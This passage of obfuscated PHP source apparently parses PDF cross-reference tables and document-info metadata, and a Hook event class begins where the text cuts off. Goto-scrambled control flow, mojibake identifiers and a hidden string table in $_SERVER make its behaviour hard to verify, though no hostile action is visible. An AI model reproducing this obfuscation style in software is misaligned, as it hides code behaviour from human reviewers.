$Eí ÎÌÛ Ò); $D¬Â•òšÃí[$B°Â”ßÀôÃ[1553]] = StreamWrapperIO::read($CÁß¨¢ºÍÚ, $D¬Â•òšÃí[$B°Â”ßÀôÃ[77]] - $Eí ÎÌÛ Ò, $Eí ÎÌÛ Ò); $eå×õùí = self::decodeXref($D¬Â•òšÃí); goto BÏ½»™°‹‘; DÎˆš©©ãÂ: $b·åŠÔÏ¹ = $B°Â”ßÀôÃ[1556]; preg_match($b·åŠÔÏ¹, $D¬Â•òšÃí[$B°Â”ßÀôÃ[1552]], $A©†‰¶‘°); if (!$e äë‚öªË[$B°Â”ßÀôÃ[1555]] && count($A©†‰¶‘°) == 5) { $e äë‚öªË[$B°Â”ßÀôÃ[1555]] = $A©†‰¶‘°[3]; $e äë‚öªË[$B°Â”ßÀôÃ[1557]] = $A©†‰¶‘°[4]; } goto e©ì×ƒÉ©; e°êŸê…‚ğ: if ($A©†‰¶‘°[1] && $e äë‚öªË[$B°Â”ßÀôÃ[1559]] < $A©†‰¶‘°[1][0]) { $e äë‚öªË[$B°Â”ßÀôÃ[1559]] = $A©†‰¶‘°[1][0]; } $e äë‚öªË = self::parseInfoItem($e äë‚öªË); return $e äë‚öªË; goto CÄˆ±¤äğ–; e©ì×ƒÉ©: preg_match($b·åŠÔÏ¹, $D¬Â•òšÃí[$B°Â”ßÀôÃ[1553]], $A©†‰¶‘°); if (!$e äë‚öªË[$B°Â”ßÀôÃ[1555]] && count($A©†‰¶‘°) == 5) { $e äë‚öªË[$B°Â”ßÀôÃ[1555]] = $A©†‰¶‘°[3]; $e äë‚öªË[$B°Â”ßÀôÃ[1557]] = $A©†‰¶‘°[4]; } preg_match($B°Â”ßÀôÃ[1558], $D¬Â•òšÃí[$B°Â”ßÀôÃ[1552]], $A©†‰¶‘°); goto EÅ÷Ó…Ÿî®; cì²øŞâä: preg_match_all($b·åŠÔÏ¹, $D¬Â•òšÃí[$B°Â”ßÀôÃ[1552]], $A©†‰¶‘°); if ($A©†‰¶‘°[1] && $e äë‚öªË[$B°Â”ßÀôÃ[1559]] < $A©†‰¶‘°[1][0]) { $e äë‚öªË[$B°Â”ßÀôÃ[1559]] = $A©†‰¶‘°[1][0]; } preg_match_all($b·åŠÔÏ¹, $D¬Â•òšÃí[$B°Â”ßÀôÃ[1553]], $A©†‰¶‘°); goto e°êŸê…‚ğ; BÏ½»™°‹‘: if ($eå×õùí) { $d„¶Í²“Èó = $eå×õùí[$B°Â”ßÀôÃ[1554]][$B°Â”ßÀôÃ[1210]]; $e äë‚öªË = self::getObjectValue($D¬Â•òšÃí, $eå×õùí, $d„¶Í²“Èó); } $e äë‚öªË = is_array($e äë‚öªË) ? $e äë‚öªË : array(); $e äë‚öªË[$B°Â”ßÀôÃ[1555]] = 0; goto DÎˆš©©ãÂ; CÄˆ±¤äğ–: } private static function parseInfoItem($fÖƒ†‚ÚÍ•) { $B±åÖÀ£Âñ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$fÖƒ†‚ÚÍ•) { return !1; } $eØ¨¤äÛá = array($B±åÖÀ£Âñ[1362] => array($B±åÖÀ£Âñ[1561], $B±åÖÀ£Âñ[33]), $B±åÖÀ£Âñ[1562] => array($B±åÖÀ£Âñ[1563], $B±åÖÀ£Âñ[33]), $B±åÖÀ£Âñ[187] => array($B±åÖÀ£Âñ[1564], $B±åÖÀ£Âñ[210]), $B±åÖÀ£Âñ[107] => array($B±åÖÀ£Âñ[1565], $B±åÖÀ£Âñ[210]), $B±åÖÀ£Âñ[1559] => array($B±åÖÀ£Âñ[1559], $B±åÖÀ£Âñ[276]), $B±åÖÀ£Âñ[1555] => array($B±åÖÀ£Âñ[1555], $B±åÖÀ£Âñ[276]), $B±åÖÀ£Âñ[1557] => array($B±åÖÀ£Âñ[1557], $B±åÖÀ£Âñ[276]), $B±åÖÀ£Âñ[1566] => array($B±åÖÀ£Âñ[1567], $B±åÖÀ£Âñ[33]), $B±åÖÀ£Âñ[1568] => array($B±åÖÀ£Âñ[1569], $B±åÖÀ£Âñ[33]), $B±åÖÀ£Âñ[1570] => array($B±åÖÀ£Âñ[1361], $B±åÖÀ£Âñ[33])); $e‡˜éÉÁà¦ = array(); foreach ($eØ¨¤äÛá as $eĞôàŒˆç† => $f ÆºçÒÏº) { if (!isset($fÖƒ†‚ÚÍ•[$f ÆºçÒÏº[0]])) { continue; } $b–ŞÀ“ñÉ = $fÖƒ†‚ÚÍ•[$f ÆºçÒÏº[0]]; if (!$b–ŞÀ“ñÉ || is_array($b–ŞÀ“ñÉ)) { continue; } switch ($f ÆºçÒÏº[1]) { case $B±åÖÀ£Âñ[276]: $b–ŞÀ“ñÉ = intval($b–ŞÀ“ñÉ); break; case $B±åÖÀ£Âñ[210]: if (substr($b–ŞÀ“ñÉ, 0, 2) == $B±åÖÀ£Âñ[1571]) { $b–ŞÀ“ñÉ = substr($b–ŞÀ“ñÉ, 2, 14); } if (strtotime($b–ŞÀ“ñÉ)) { $b–ŞÀ“ñÉ = date($B±åÖÀ£Âñ[1572], strtotime($b–ŞÀ“ñÉ)); } break; } $e‡˜éÉÁà¦[$eĞôàŒˆç†] = $b–ŞÀ“ñÉ; } return $e‡˜éÉÁà¦; } private static function decodeXref(&$fŒøÆªİÚ™) { goto DÎ¬×¸Ê–›; A—ŞÅ»×±æ: foreach ($CÕÑìºİ‘[3] as $FÕÀÕÄÌÍ => $f÷Ğé¥ê •) { if ($CÕÑìºİ‘[3][$FÕÀÕÄÌÍ] == $BÄ’Ë©˜Ê[1576]) { $BÅÊ§»ˆò = $AÍ×¿›ÕÅ . $BÄ’Ë©˜Ê[70] . intval($CÕÑìºİ‘[2][$FÕÀÕÄÌÍ]); $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1573]][$BÅÊ§»ˆò] = intval($CÕÑìºİ‘[1][$FÕÀÕÄÌÍ]); ++$AÍ×¿›ÕÅ; } else { if ($CÕÑìºİ‘[3][$FÕÀÕÄÌÍ] == $BÄ’Ë©˜Ê[1577]) { ++$AÍ×¿›ÕÅ; } else { } } } if (preg_match_all($BÄ’Ë©˜Ê[1578], $a‚ÚÖõíàŸ, $CÕÑìºİ‘)) { $cÂÆÀ¥×º… = $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[77]] - $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1551]]; foreach ($CÕÑìºİ‘[0] as $FÕÀÕÄÌÍ => $E´Æ¨ÃâÈ) { $E¬ºƒ«À¶ = $CÕÑìºİ‘[1][$FÕÀÕÄÌÍ] . $BÄ’Ë©˜Ê[70] . $CÕÑìºİ‘[2][$FÕÀÕÄÌÍ]; $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1573]][$E¬ºƒ«À¶] = strpos($a‚ÚÖõíàŸ, $E´Æ¨ÃâÈ) + $cÂÆÀ¥×º… + 1; } } if (preg_match_all($BÄ’Ë©˜Ê[1579], $a‚ÚÖõíàŸ, $CÕÑìºİ‘)) { $C‹è–‚Èà = count($CÕÑìºİ‘[1]) == 1 ? $CÕÑìºİ‘[1][0] : $CÕÑìºİ‘[1][1]; } else { $C‹è–‚Èà = substr($a‚ÚÖõíàŸ, -1024 * 5); } goto d§æö¡è¹ ; A¬õëºæ§…: $A‡Íï‰‰ = $BÄ’Ë©˜Ê[1574]; if (!preg_match_all($A‡Íï‰‰, $a‚ÚÖõíàŸ, $CÕÑìºİ‘, PREG_SET_ORDER, 0)) { return !1; } $a÷‰êâ÷Şª = intval($CÕÑìºİ‘[0][1]); goto E°”¥½³‡; d§æö¡è¹ : if (preg_match($BÄ’Ë©˜Ê[1580], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[77]] = intval($CÕÑìºİ‘[1]); } if (preg_match($BÄ’Ë©˜Ê[1581], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[1582]] = intval($CÕÑìºİ‘[1]) . $BÄ’Ë©˜Ê[70] . intval($CÕÑìºİ‘[2]); } if (preg_match($BÄ’Ë©˜Ê[1583], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[1584]] = intval($CÕÑìºİ‘[1]) . $BÄ’Ë©˜Ê[70] . intval($CÕÑìºİ‘[2]); } goto d‘¼­šŠçƒ; DÎ¬×¸Ê–›: $BÄ’Ë©˜Ê =& $_SERVER[ã®Â„Éæ¹¤]; $a‚ÚÖõíàŸ = $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1553]]; $A¦ÊÊßô¥ = array($BÄ’Ë©˜Ê[1554] => array(), $BÄ’Ë©˜Ê[1573] => array()); goto A¬õëºæ§…; CãÏÅÏÒÔ: if (preg_match($BÄ’Ë©˜Ê[1587], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { } return $A¦ÊÊßô¥; goto c¢ù‡©æÆá; E°”¥½³‡: if ($fŒøÆªİÚ™[$BÄ’Ë©˜Ê[77]] - $a÷‰êâ÷Şª > $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1551]]) { $Bô•Î¥›¿â = 4 * $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1551]]; $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1551]] = $Bô•Î¥›¿â; $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1552]] = StreamWrapperIO::read($fŒøÆªİÚ™[$BÄ’Ë©˜Ê[75]], 0, $Bô•Î¥›¿â); $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1553]] = StreamWrapperIO::read($fŒøÆªİÚ™[$BÄ’Ë©˜Ê[75]], $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[77]] - $Bô•Î¥›¿â, $Bô•Î¥›¿â); $a‚ÚÖõíàŸ = $fŒøÆªİÚ™[$BÄ’Ë©˜Ê[1553]]; } $AÍ×¿›ÕÅ = 0; preg_match_all($BÄ’Ë©˜Ê[1575], $a‚ÚÖõíàŸ, $CÕÑìºİ‘); goto A—ŞÅ»×±æ; d‘¼­šŠçƒ: if (preg_match($BÄ’Ë©˜Ê[1585], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[1210]] = intval($CÕÑìºİ‘[1]) . $BÄ’Ë©˜Ê[70] . intval($CÕÑìºİ‘[2]); } if (preg_match($BÄ’Ë©˜Ê[1586], $C‹è–‚Èà, $CÕÑìºİ‘) > 0) { $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[367]] = array(); $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[367]][0] = $CÕÑìºİ‘[1]; $A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[367]][1] = $CÕÑìºİ‘[2]; } if (!$A¦ÊÊßô¥[$BÄ’Ë©˜Ê[1554]][$BÄ’Ë©˜Ê[1210]]) { return !1; } goto CãÏÅÏÒÔ; c¢ù‡©æÆá: } private static function getObjectValue($D„ÙÀ…‚÷ˆ, $D­Ú©‚šãÓ, $c×´î’ƒÍ×) { goto f¬õ•¨†œ; bë˜òñç: return $cªõ¾¢—Œ; goto C¦š«’´ø¼; f¬õ•¨†œ: $EÛ¥¯£Á¦´ =& $_SERVER[ã®Â„Éæ¹¤]; $B“ëÀê×ôÇ = self::getObject($D„ÙÀ…‚÷ˆ, $D­Ú©‚šãÓ[$EÛ¥¯£Á¦´[1573]][$c×´î’ƒÍ×]); if (is_string($B“ëÀê×ôÇ[1])) { return $B“ëÀê×ôÇ[1]; } goto Fß‡Ï…×Ó; Fß‡Ï…×Ó: if (!is_array($B“ëÀê×ôÇ[1])) { return array(); } $cªõ¾¢—Œ = array(); for ($c‘Øî—¹ŸÀ = 0; $c‘Øî—¹ŸÀ < count($B“ëÀê×ôÇ[1]); $c‘Øî—¹ŸÀ += 2) { $e·±ğÌì¯‚ = $B“ëÀê×ôÇ[1][$c‘Øî—¹ŸÀ]; $bã»Õ½õò¸ = $B“ëÀê×ôÇ[1][$c‘Øî—¹ŸÀ + 1]; if (count($e·±ğÌì¯‚) == 3 && $e·±ğÌì¯‚[0] == $EÛ¥¯£Á¦´[8]) { $dèµŠ»ÊšØ = !1; if ($bã»Õ½õò¸[0] == $EÛ¥¯£Á¦´[1588]) { $bã»Õ½õò¸ = self::getObject($D„ÙÀ…‚÷ˆ, $D­Ú©‚šãÓ[$EÛ¥¯£Á¦´[1573]][$bã»Õ½õò¸[1]]); } $dèµŠ»ÊšØ = $bã»Õ½õò¸[1]; if ($dèµŠ»ÊšØ === !1) { continue; } if (is_string($dèµŠ»ÊšØ)) { $dèµŠ»ÊšØ = self::decodeStr($dèµŠ»ÊšØ); } $cªõ¾¢—Œ[$e·±ğÌì¯‚[1]] = $dèµŠ»ÊšØ; } } goto bë˜òñç; C¦š«’´ø¼: } private static function getObject($dÀò’‡„Ñ¬, $eøªãëîŒÇ) { $c¬“ñ“¡ = self::getObjectItem($dÀò’‡„Ñ¬, $eøªãëîŒÇ); $c¬“ñ“¡ = self::getObjectItem($dÀò’‡„Ñ¬, $c¬“ñ“¡[2]); return $c¬“ñ“¡; } private static function getObjectItem($a´‰õ•‘‰å, $Fë¯½´ª°‹) { goto E†¸°½Ñ¢è; Eç›à„ÆÏ: $Eš÷áœ…ÒÏ = $Fë¯½´ª°‹ >= $e†ÔÆ®â›î ? $Fë¯½´ª°‹ - $e†ÔÆ®â›î : $Fë¯½´ª°‹; $a÷Ñ‚‘°‘è = $Fë¯½´ª°‹ >= $e†ÔÆ®â›î ? $a´‰õ•‘‰å[$aš”ôâ“¦î[1553]] : $a´‰õ•‘‰å[$aš”ôâ“¦î[1552]]; if ($Fë¯½´ª°‹ > $CŒ¬Æ©œÌ¡ && $Fë¯½´ª°‹ <= $e†ÔÆ®â›î) { $Eš÷áœ…ÒÏ = 0; $a÷Ñ‚‘°‘è = StreamWrapperIO::read($a´‰õ•‘‰å[$aš”ôâ“¦î[75]], $Fë¯½´ª°‹, $CŒ¬Æ©œÌ¡); } goto d§²Ò ‹Ÿ†; d§²Ò ‹Ÿ†: $c¢Ó¢—…É = self::getRawObject($a÷Ñ‚‘°‘è, $Eš÷áœ…ÒÏ); if ($Fë¯½´ª°‹ >= $e†ÔÆ®â›î) { $c¢Ó¢—…É[2] = $c¢Ó¢—…É[2] + $e†ÔÆ®â›î; } else { if ($Fë¯½´ª°‹ > $CŒ¬Æ©œÌ¡ && $Fë¯½´ª°‹ <= $e†ÔÆ®â›î) { $c¢Ó¢—…É[2] = $c¢Ó¢—…É[2] + $Fë¯½´ª°‹; } } return $c¢Ó¢—…É; goto a‚Ş¶Ñí‹; E†¸°½Ñ¢è: $aš”ôâ“¦î =& $_SERVER[ã®Â„Éæ¹¤]; $CŒ¬Æ©œÌ¡ = $a´‰õ•‘‰å[$aš”ôâ“¦î[1551]]; $e†ÔÆ®â›î = $a´‰õ•‘‰å[$aš”ôâ“¦î[77]] - $CŒ¬Æ©œÌ¡; goto Eç›à„ÆÏ; a‚Ş¶Ñí‹: } private static function decodeStr($f¤ßÑÅù†Š) { goto aÒŒÃ˜¹ã´; fæ¿´Ö¨é: $f¤ßÑÅù†Š = $D±ƒÁ÷é´ƒ[33]; foreach ($bƒÉ–«¹ø as $Få¬¥…Ö©§) { if (preg_match($D±ƒÁ÷é´ƒ[1603], $Få¬¥…Ö©§) && !1 === stripos($Få¬¥…Ö©§, $D±ƒÁ÷é´ƒ[1604])) { $Få¬¥…Ö©§ = preg_replace($D±ƒÁ÷é´ƒ[1605], $D±ƒÁ÷é´ƒ[33], $Få¬¥…Ö©§); $Få¬¥…Ö©§ = trim($Få¬¥…Ö©§, $D±ƒÁ÷é´ƒ[944]); $Få¬¥…Ö©§ = pack($D±ƒÁ÷é´ƒ[1606], $Få¬¥…Ö©§); $f¤ßÑÅù†Š .= $Få¬¥…Ö©§; } else { $f¤ßÑÅù†Š .= $Få¬¥…Ö©§; } } if (preg_match($D±ƒÁ÷é´ƒ[1607], $f¤ßÑÅù†Š)) { $bùĞ†¦ó = substr($f¤ßÑÅù†Š, 2); $f¤ßÑÅù†Š = $D±ƒÁ÷é´ƒ[33]; $dŒ”²Äî‚‚ = strlen($bùĞ†¦ó); for ($a½ˆ¬ˆ¡×Ğ = 0; $a½ˆ¬ˆ¡×Ğ < $dŒ”²Äî‚‚; $a½ˆ¬ˆ¡×Ğ += 2) { $EÛŠÌœˆÅâ = hexdec(bin2hex(substr($bùĞ†¦ó, $a½ˆ¬ˆ¡×Ğ, 2))); $f¤ßÑÅù†Š .= mb_convert_encoding($D±ƒÁ÷é´ƒ[1608] . intval($EÛŠÌœˆÅâ) . $D±ƒÁ÷é´ƒ[67], $D±ƒÁ÷é´ƒ[1609], $D±ƒÁ÷é´ƒ[1610]); } } goto CÄ¡Õö£¢Ù; CÄ¡Õö£¢Ù: return $f¤ßÑÅù†Š; goto cñ×µˆÛˆÙ; aÒŒÃ˜¹ã´: $D±ƒÁ÷é´ƒ =& $_SERVER[ã®Â„Éæ¹¤]; $f¤ßÑÅù†Š = str_replace(array($D±ƒÁ÷é´ƒ[1589], $D±ƒÁ÷é´ƒ[1590], $D±ƒÁ÷é´ƒ[1591], $D±ƒÁ÷é´ƒ[1592], $D±ƒÁ÷é´ƒ[1593], $D±ƒÁ÷é´ƒ[1594], $D±ƒÁ÷é´ƒ[1595], $D±ƒÁ÷é´ƒ[1596]), array($D±ƒÁ÷é´ƒ[93], $D±ƒÁ÷é´ƒ[50], $D±ƒÁ÷é´ƒ[8], $D±ƒÁ÷é´ƒ[248], $D±ƒÁ÷é´ƒ[838], $D±ƒÁ÷é´ƒ[217], $D±ƒÁ÷é´ƒ[1011], $D±ƒÁ÷é´ƒ[330]), $f¤ßÑÅù†Š); $bƒÉ–«¹ø = preg_split($D±ƒÁ÷é´ƒ[1597], $f¤ßÑÅù†Š, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aÆÑ«äğ®¸; aÆÑ«äğ®¸: $f¤ßÑÅù†Š = $D±ƒÁ÷é´ƒ[33]; foreach ($bƒÉ–«¹ø as $Få¬¥…Ö©§) { if (preg_match($D±ƒÁ÷é´ƒ[1598], $Få¬¥…Ö©§)) { $f¤ßÑÅù†Š .= \chr(octdec(trim($Få¬¥…Ö©§, $D±ƒÁ÷é´ƒ[93]))); } else { $f¤ßÑÅù†Š .= $Få¬¥…Ö©§; } } $bƒÉ–«¹ø = preg_split($D±ƒÁ÷é´ƒ[1599], $f¤ßÑÅù†Š, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a¢îä¼ÄÖ¶; a¢îä¼ÄÖ¶: $f¤ßÑÅù†Š = $D±ƒÁ÷é´ƒ[33]; foreach ($bƒÉ–«¹ø as $Få¬¥…Ö©§) { if (preg_match($D±ƒÁ÷é´ƒ[1600], $Få¬¥…Ö©§)) { $f¤ßÑÅù†Š .= \chr(hexdec(trim($Få¬¥…Ö©§, $D±ƒÁ÷é´ƒ[1601]))); } else { $f¤ßÑÅù†Š .= $Få¬¥…Ö©§; } } $bƒÉ–«¹ø = preg_split($D±ƒÁ÷é´ƒ[1602], $f¤ßÑÅù†Š, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fæ¿´Ö¨é; cñ×µˆÛˆÙ: } private static function getRawObject($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó = 0) { goto D‡İ¾™óØğ; aÍÚ„³ïŒ²: $C‚ä±ì¢¸Ó += strspn($Aˆñ—˜‘¯Š, $eøÇêÓƒÂŞ[1611], $C‚ä±ì¢¸Ó); $E‰ğªÎÍ› = $Aˆñ—˜‘¯Š[$C‚ä±ì¢¸Ó]; switch ($E‰ğªÎÍ›) { case $eøÇêÓƒÂŞ[1612]: $f¥ ÎˆË®ï = strcspn($Aˆñ—˜‘¯Š, $eøÇêÓƒÂŞ[1613], $C‚ä±ì¢¸Ó); if ($f¥ ÎˆË®ï > 0) { $C‚ä±ì¢¸Ó += $f¥ ÎˆË®ï; return self::getRawObject($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó); } break; case $eøÇêÓƒÂŞ[8]: $Dì³“ÛÕï¶ = $E‰ğªÎÍ›; ++$C‚ä±ì¢¸Ó; $e–›ë…ª  = preg_match($eøÇêÓƒÂŞ[1614], substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 256), $e¦Æ³¬¨¸¤); if (1 == $e–›ë…ª ) { $cµ“ÅÙ—¶È = $e¦Æ³¬¨¸¤[1]; $C‚ä±ì¢¸Ó += strlen($cµ“ÅÙ—¶È); } break; case $eøÇêÓƒÂŞ[248]: case $eøÇêÓƒÂŞ[838]: $Dì³“ÛÕï¶ = $E‰ğªÎÍ›; ++$C‚ä±ì¢¸Ó; $AÊæšĞöçº = $C‚ä±ì¢¸Ó; if ($eøÇêÓƒÂŞ[248] == $E‰ğªÎÍ›) { $AÌÚ¤•Ğ¯¸ = 1; while ($AÌÚ¤•Ğ¯¸ > 0) { if (!isset($Aˆñ—˜‘¯Š[$AÊæšĞöçº])) { break; } $AÒŒ•İÅñ = $Aˆñ—˜‘¯Š[$AÊæšĞöçº]; switch ($AÒŒ•İÅñ) { case $eøÇêÓƒÂŞ[93]: ++$AÊæšĞöçº; break; case $eøÇêÓƒÂŞ[248]: ++$AÌÚ¤•Ğ¯¸; break; case $eøÇêÓƒÂŞ[838]: --$AÌÚ¤•Ğ¯¸; break; } ++$AÊæšĞöçº; } $cµ“ÅÙ—¶È = substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, $AÊæšĞöçº - $C‚ä±ì¢¸Ó - 1); $C‚ä±ì¢¸Ó = $AÊæšĞöçº; } break; case $eøÇêÓƒÂŞ[157]: case $eøÇêÓƒÂŞ[478]: $Dì³“ÛÕï¶ = $E‰ğªÎÍ›; ++$C‚ä±ì¢¸Ó; if ($eøÇêÓƒÂŞ[157] == $E‰ğªÎÍ›) { $cµ“ÅÙ—¶È = array(); do { $c££§‹Ö¡İ = $C‚ä±ì¢¸Ó; $a–‡†ì¤Ÿ = self::getRawObject($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó); $C‚ä±ì¢¸Ó = $a–‡†ì¤Ÿ[2]; $cµ“ÅÙ—¶È[] = $a–‡†ì¤Ÿ; } while ($eøÇêÓƒÂŞ[478] != $a–‡†ì¤Ÿ[0] && $C‚ä±ì¢¸Ó != $c££§‹Ö¡İ); array_pop($cµ“ÅÙ—¶È); } break; case $eøÇêÓƒÂŞ[943]: case $eøÇêÓƒÂŞ[946]: if (isset($Aˆñ—˜‘¯Š[$C‚ä±ì¢¸Ó + 1]) && $Aˆñ—˜‘¯Š[$C‚ä±ì¢¸Ó + 1] == $E‰ğªÎÍ›) { $Dì³“ÛÕï¶ = $E‰ğªÎÍ› . $E‰ğªÎÍ›; $C‚ä±ì¢¸Ó += 2; if ($eøÇêÓƒÂŞ[943] == $E‰ğªÎÍ›) { $cµ“ÅÙ—¶È = array(); do { $c££§‹Ö¡İ = $C‚ä±ì¢¸Ó; $a–‡†ì¤Ÿ = self::getRawObject($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó); $C‚ä±ì¢¸Ó = $a–‡†ì¤Ÿ[2]; $cµ“ÅÙ—¶È[] = $a–‡†ì¤Ÿ; } while ($eøÇêÓƒÂŞ[1615] != $a–‡†ì¤Ÿ[0] && $C‚ä±ì¢¸Ó != $c££§‹Ö¡İ); array_pop($cµ“ÅÙ—¶È); } } else { $Dì³“ÛÕï¶ = $E‰ğªÎÍ›; ++$C‚ä±ì¢¸Ó; $e–›ë…ª  = preg_match($eøÇêÓƒÂŞ[1616], substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó), $e¦Æ³¬¨¸¤); if ($eøÇêÓƒÂŞ[943] == $E‰ğªÎÍ› && 1 == $e–›ë…ª ) { $cµ“ÅÙ—¶È = strtr($e¦Æ³¬¨¸¤[1], $eøÇêÓƒÂŞ[1617], $eøÇêÓƒÂŞ[33]); $C‚ä±ì¢¸Ó += \strlen($e¦Æ³¬¨¸¤[0]); } elseif (!1 !== ($CâšÃ¶ñ›Ç = strpos($Aˆñ—˜‘¯Š, $eøÇêÓƒÂŞ[946], $C‚ä±ì¢¸Ó))) { $C‚ä±ì¢¸Ó = $CâšÃ¶ñ›Ç + 1; } } break; default: if ($eøÇêÓƒÂŞ[1618] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 6)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1618]; $C‚ä±ì¢¸Ó += 6; } elseif ($eøÇêÓƒÂŞ[99] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 4)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[99]; $C‚ä±ì¢¸Ó += 4; $cµ“ÅÙ—¶È = $eøÇêÓƒÂŞ[99]; } elseif ($eøÇêÓƒÂŞ[1619] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 4)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1620]; $C‚ä±ì¢¸Ó += 4; $cµ“ÅÙ—¶È = $eøÇêÓƒÂŞ[1619]; } elseif ($eøÇêÓƒÂŞ[1621] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 5)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1620]; $C‚ä±ì¢¸Ó += 5; $cµ“ÅÙ—¶È = $eøÇêÓƒÂŞ[1621]; } elseif ($eøÇêÓƒÂŞ[1622] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 6)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1622]; $C‚ä±ì¢¸Ó += 6; if (1 == preg_match($eøÇêÓƒÂŞ[1623], substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó), $e¦Æ³¬¨¸¤)) { $C‚ä±ì¢¸Ó += strlen($e¦Æ³¬¨¸¤[0]); $C‹î¯ÑåŸ = $eøÇêÓƒÂŞ[1624]; $e–›ë…ª  = preg_match($C‹î¯ÑåŸ, substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó), $e¦Æ³¬¨¸¤, PREG_OFFSET_CAPTURE); if (1 == $e–›ë…ª ) { $cµ“ÅÙ—¶È = substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, $e¦Æ³¬¨¸¤[0][1]); $C‚ä±ì¢¸Ó += $e¦Æ³¬¨¸¤[1][1]; } } } elseif ($eøÇêÓƒÂŞ[1625] == substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 9)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1625]; $C‚ä±ì¢¸Ó += 9; } elseif (1 == preg_match($eøÇêÓƒÂŞ[1626], substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 33), $e¦Æ³¬¨¸¤)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1588]; $C‚ä±ì¢¸Ó += strlen($e¦Æ³¬¨¸¤[0]); $cµ“ÅÙ—¶È = intval($e¦Æ³¬¨¸¤[1]) . $eøÇêÓƒÂŞ[70] . intval($e¦Æ³¬¨¸¤[2]); } elseif (1 == preg_match($eøÇêÓƒÂŞ[1627], substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, 33), $e¦Æ³¬¨¸¤)) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1628]; $cµ“ÅÙ—¶È = intval($e¦Æ³¬¨¸¤[1]) . $eøÇêÓƒÂŞ[70] . intval($e¦Æ³¬¨¸¤[2]); $C‚ä±ì¢¸Ó += strlen($e¦Æ³¬¨¸¤[0]); } elseif (($dõõ¼ŠË« = strspn($Aˆñ—˜‘¯Š, $eøÇêÓƒÂŞ[1629], $C‚ä±ì¢¸Ó)) > 0) { $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[1630]; $cµ“ÅÙ—¶È = substr($Aˆñ—˜‘¯Š, $C‚ä±ì¢¸Ó, $dõõ¼ŠË«); $C‚ä±ì¢¸Ó += $dõõ¼ŠË«; } break; } goto CÒ¤¢ÒóÕ; D‡İ¾™óØğ: $eøÇêÓƒÂŞ =& $_SERVER[ã®Â„Éæ¹¤]; $Dì³“ÛÕï¶ = $eøÇêÓƒÂŞ[33]; $cµ“ÅÙ—¶È = $eøÇêÓƒÂŞ[33]; goto aÍÚ„³ïŒ²; CÒ¤¢ÒóÕ: return array($Dì³“ÛÕï¶, $cµ“ÅÙ—¶È, $C‚ä±ì¢¸Ó); goto C ¯½°Á¹; C ¯½°Á¹: } } goto eÕšùœöğ¸; bŠ…¼Ø»¯Ô: class Hook { private static $events = array(); public static function get($BÍ¢ñŒ·ô = false) { if (!$BÍ¢ñŒ·ô) { return self::$events; } else { return self::$events[$BÍ¢ñŒ·ô]; } } public static function apply($a¢¿ÆÉîÙ, $DÉÃÒ£Š† = array()) { $E‰àƒí” = ActionApply($a¢¿ÆÉîÙ, $DÉÃÒ£Š†); if (is_string($a¢¿ÆÉîÙ)) { Hook::trigger($a¢¿ÆÉîÙ); } return $E‰àƒí”; } public static function bind($c†›¤œîáå, $e›­™àƒ, $D†´£¦ÏÎ = false) { $Eğ˜È¼Å£ =& 